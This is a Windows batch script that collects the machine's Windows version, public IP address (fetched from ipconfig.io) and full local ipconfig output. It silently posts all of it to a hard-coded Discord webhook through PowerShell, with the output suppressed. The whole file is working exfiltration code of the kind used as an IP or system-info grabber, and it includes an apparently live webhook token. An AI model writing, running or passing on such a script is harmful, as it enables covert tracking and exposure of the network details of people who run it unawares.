@echo off
setlocal enabledelayedexpansion


set "WEBHOOK_URL=https://discord.com/api/webhooks/1505350483416453183/ecVoN1d3vBxunpaaZzeUsKxNUyKKjM0GXCjskozuSQ8x5pf3yf9VnTM4NS4b9AV2f7JL"


for /f "tokens=2 delims=[]" %%i in ('ver') do set "WIN_VER=%%i"


for /f "delims=" %%a in ('curl -s ipconfig.io') do set "PUBLIC_IP=%%a"


set "IP_INFO="
for /f "delims=" %%a in ('ipconfig') do (
    set "line=%%a"

    set "line=!line:   =!"
    set "IP_INFO=!IP_INFO!\n!line!"
)

:: Escape backslashes and quotes for JSON safety
set "WIN_VER=%WIN_VER:\=\\%"
set "WIN_VER=%WIN_VER:"=% "
set "PUBLIC_IP=%PUBLIC_IP:\=\\%"
set "PUBLIC_IP=%PUBLIC_IP:"=% "
set "IP_INFO=%IP_INFO:\=\\%"
set "IP_INFO=%IP_INFO:"=% "




powershell -Command ^
    "$msg = '{\"content\": \"### Full System Information Report\n**Windows Version:** %WIN_VER%\n\n**ipconfig.io Output:**\n`%PUBLIC_IP%`\n\n**Full Local ipconfig Output:**\n```%IP_INFO%```\"}';" ^
    "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -ContentType 'application/json' -Body ([System.Text.Encoding]::UTF8.GetBytes($msg))" >nul


pause